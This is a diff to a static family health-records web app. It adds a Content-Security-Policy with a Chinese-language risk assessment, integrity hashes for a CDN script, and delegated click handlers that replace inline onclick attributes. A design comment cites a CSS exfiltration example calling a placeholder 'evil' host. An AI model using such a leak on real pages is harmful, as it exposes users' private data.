@@ -2,6 +2,95 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+
+  <!-- ============================================================
+       Content-Security-Policy —— 设计说明 / 风险评估（供以后审计或收紧策略时查阅）
+       更新日期：2026-08-06
+
+       目标：降低 XSS 的“利用后果”，而不是依赖它防住已知的输入转义问题
+       （转义问题另见 escapeHtml() 的使用审计，已逐一走查全部 innerHTML /
+       document.write 渲染路径，未发现未转义的用户输入）。
+
+       1. script-src 用 'sha256-...' 精确哈希白名单，而不是 'unsafe-inline'：
+          - 本应用是纯静态单文件（无后端渲染），无法用随机 nonce（nonce 必须
+            每次请求由服务端重新生成且不可预测；写死在静态 HTML 里的 nonce
+            对攻击者同样可见，起不到防护作用）。
+          - 因此改用对内联 <script> 整块内容做 SHA-256 哈希 + 'unsafe-hashes'
+            不使用（见下条），只放行这一块已知内容，浏览器执行前会比对哈希，
+            不匹配就拒绝执行 —— 这样即使未来某处转义遗漏、攻击者能把
+            <script>...</script> 或事件属性注入到页面里，注入的代码本身
+            拿不到匹配的哈希，也就无法执行。
+          - 代价（需要人工维护）：这段哈希对应的是当前这一整块 <script> 的
+            精确字节内容。以后只要改动这块脚本里哪怕一个字符，哈希就会失效，
+            整个 App 会白屏（脚本被 CSP 拦截，控制台会报 CSP violation）。
+            改完脚本后运行 `python3 scripts/update_csp_hash.py` 重新计算并自动
+            写回这里的哈希；仓库里配了 `.githooks/pre-commit`（一次性执行
+            `git config core.hooksPath .githooks` 启用），会在哈希和脚本内容
+            对不上时拦截 commit，提示先跑这个脚本再提交。
+            （如果文件里出现了不止一个内联 <script>，需要调整
+            scripts/update_csp_hash.py 里的定位正则。）
+
+       2. 主文档里原来的 8 处 onclick="..." 已重构成 data-* 属性 + 一个
+          document 级别的委托 click 监听器（见文末“Delegated click handler”），
+          所以这 8 处不再需要 'unsafe-inline'。已确认：
+          - 这 8 处内嵌的都是内部生成的 UUID（m.id / memberId），不是用户输入，
+            所以重构前也没有属性逃逸风险，重构主要是为了让 CSP 能去掉
+            'unsafe-inline'。
+          - 文档里剩余的 onclick="window.print()" 和一处
+            <script>window.onload=...</script>，全部在 printWindow.document.write(...)
+            生成的独立弹出窗口文档里，不受本 <meta> CSP 约束（每个 window 有自己
+            的文档/CSP）。如果以后想连弹出窗口也一起收紧，需要在对应的
+            document.write 内容里单独加一份 CSP <meta>，本次未做（超出本次改动范围）。
+
+       3. style-src 保留了 'unsafe-inline'（结论：这里不收紧）：
+          - 应用大量使用内联 style="..." 属性和一个 <style> 块，全部改造成
+            class 需要重写全部渲染函数，工作量和本次改动的目标（收紧 script
+            执行）不成比例。
+          - 风险评估：CSS 注入的可利用面显著小于脚本注入 —— CSS 不能直接执行
+            任意代码，主要风险是“通过属性选择器探测/外泄页面上其它数据”，这类
+            攻击通常还需要能控制 CSS *内容本身* 加上外部网络请求（如
+            background:url(https://evil/?leak) 探测选择器命中）；本 CSP 的
+            connect-src/img-src 已限制到 'self'/data:/blob:，跨域外泄通道
+            基本被堵住，进一步降低了保留 style-src unsafe-inline 的实际风险。
+          - 如果以后要收紧：需要把所有 style="..." 迁移到预定义的 CSS class，
+            工作量较大，建议单独立项而不是顺带做。
+
+       4. frame-ancestors 没有写进这个 <meta> 标签：
+          - 这是 CSP 规范的限制，不是遗漏——frame-ancestors / sandbox 等指令
+            通过 <meta http-equiv> 声明时会被浏览器直接忽略，只有通过 HTTP
+            响应头（Content-Security-Policy 头）设置才生效。
+          - 如果需要防点击劫持，必须换一个能设自定义 HTTP 头的静态托管
+            （例如 Cloudflare Pages / Netlify 的 _headers 文件），GitHub Pages
+            本身不支持自定义响应头。这是本次改动已知但未解决的限制，留给
+            以后部署到支持自定义头的平台时再补。
+
+       5. img-src / frame-src 放开了 data: 和 blob:：
+          - data: 用于内置的 SVG favicon 以及附件缩略图（图片/PDF 都是先转成
+            data URL 存 IndexedDB，渲染时再用）。
+          - blob: 用于附件查看器（URL.createObjectURL 生成的 blob URL 赋给
+            <img>/<iframe> 预览图片和 PDF）和导出下载（a.href = blob URL）。
+          - 这两个 scheme 都只会指向“本机内存里生成的内容”，不会被攻击者
+            远程操控成外部地址，风险可控。
+
+       6. connect-src 'self'：应用是离线优先、纯本地存储（IndexedDB），代码里
+          没有 fetch()/XMLHttpRequest 调用，理论上可以设成 'none'，但留 'self'
+          是为了不影响 Service Worker 自身的资源请求，且几乎不增加实际风险。
+     ============================================================ -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'none';
+    script-src 'self' 'sha256-fqiTQGxRBLgossfV5jsKc6sWSlrcsEbFpNAEl7pu20Y=' https://cdnjs.cloudflare.com;
+    style-src 'self' 'unsafe-inline';
+    img-src 'self' data: blob:;
+    font-src 'self';
+    connect-src 'self';
+    frame-src 'self' blob:;
+    worker-src 'self';
+    manifest-src 'self';
+    object-src 'none';
+    base-uri 'none';
+    form-action 'none';
+  ">
+
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Family Health & Shield</title>
   <meta name="description" content="Family health records and insurance tracker with on-device encryption, works offline as an installable app.">
@@ -15,7 +104,9 @@
   <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop offset='0' stop-color='%234f7cff'/%3E%3Cstop offset='1' stop-color='%2310b981'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='64' height='64' rx='14' fill='url(%23g)'/%3E%3Cpath d='M32 15c-9-11-24-2-22 10 1.5 9 12 16 22 24 10-8 20.5-15 22-24 2-12-13-21-22-10z' fill='white' opacity='0.95'/%3E%3Crect x='27.5' y='24' width='9' height='22' rx='2' fill='%234f7cff'/%3E%3Crect x='20' y='31.5' width='24' height='9' rx='2' fill='%234f7cff'/%3E%3C/svg%3E">
   <link rel="apple-touch-icon" sizes="180x180" href="icons/icon-180.png">
   <link rel="shortcut icon" href="favicon.ico">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"
+    integrity="sha512-XMVd28F1oH/O71fzwBnV7HucLxVwtxf26XV8P4wPk26EDxuGZ91N8bsOttmnomcCD3CS5ZMRL50H0GgOHvegtg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
   <style>
     :root {
       --bg: #f5f7fa;
@@ -2022,13 +2113,13 @@
         <div class="card">
           <div class="card-title">📄 Reports</div>
           <div style="display:flex;flex-wrap:wrap;gap:8px;">
-            <button class="btn btn-secondary btn-sm" onclick="openReportPreview('summary','${m.id}')">📋 Health Summary</button>
-            <button class="btn btn-secondary btn-sm" onclick="openReportPreview('vaccine','${m.id}')">💉 Vaccine Record</button>
-            <button class="btn btn-secondary btn-sm" onclick="openReportPreview('medication','${m.id}')">💊 Medication List</button>
-            <button class="btn btn-secondary btn-sm" onclick="openReportPreview('lab','${m.id}')">🔬 Lab Results</button>
-            <button class="btn btn-secondary btn-sm" onclick="openReportPreview('bp','${m.id}')">🩺 BP Log</button>
-            <button class="btn btn-secondary btn-sm" onclick="openReportPreview('growth','${m.id}')">📏 Growth Chart</button>
-            <button class="btn btn-secondary btn-sm" onclick="openReportPreview('annual','${m.id}')">📅 Annual Report</button>
+            <button class="btn btn-secondary btn-sm" data-report-type="summary" data-report-member="${m.id}">📋 Health Summary</button>
+            <button class="btn btn-secondary btn-sm" data-report-type="vaccine" data-report-member="${m.id}">💉 Vaccine Record</button>
+            <button class="btn btn-secondary btn-sm" data-report-type="medication" data-report-member="${m.id}">💊 Medication List</button>
+            <button class="btn btn-secondary btn-sm" data-report-type="lab" data-report-member="${m.id}">🔬 Lab Results</button>
+            <button class="btn btn-secondary btn-sm" data-report-type="bp" data-report-member="${m.id}">🩺 BP Log</button>
+            <button class="btn btn-secondary btn-sm" data-report-type="growth" data-report-member="${m.id}">📏 Growth Chart</button>
+            <button class="btn btn-secondary btn-sm" data-report-type="annual" data-report-member="${m.id}">📅 Annual Report</button>
           </div>
         </div>
       `;
@@ -2111,7 +2202,7 @@
         <div class="card">
           <div style="display:flex;justify-content:space-between;align-items:center;">
             <div class="card-title" style="margin-bottom:0;">⏰ All Reminders</div>
-            <button class="btn btn-primary btn-sm" onclick="openReminderModal('${memberId}')">+ Add Reminder</button>
+            <button class="btn btn-primary btn-sm" data-open-reminder-modal="${memberId}">+ Add Reminder</button>
           </div>
           <div class="reminder-list" style="margin-top:12px;">
             ${reminders.map(r => `
@@ -5333,6 +5424,22 @@ ${encrypt ? `- Full encryption: the backup JSON AND every file inside attachment
           .catch(err => console.warn('Service worker registration failed:', err));
       });
     }
+
+    // ===== Delegated click handler for buttons rendered via innerHTML =====
+    // (kept as data-attributes + delegation, rather than inline onclick="", so the
+    // page's CSP can drop 'unsafe-inline' from script-src)
+    document.addEventListener('click', function(e) {
+      const reportBtn = e.target.closest('[data-report-type]');
+      if (reportBtn) {
+        openReportPreview(reportBtn.dataset.reportType, reportBtn.dataset.reportMember);
+        return;
+      }
+      const reminderBtn = e.target.closest('[data-open-reminder-modal]');
+      if (reminderBtn) {
+        openReminderModal(reminderBtn.dataset.openReminderModal);
+        return;
+      }
+    });
 
     // ===== PWA: simple offline indicator =====
     function updateOnlineStatusBanner() {
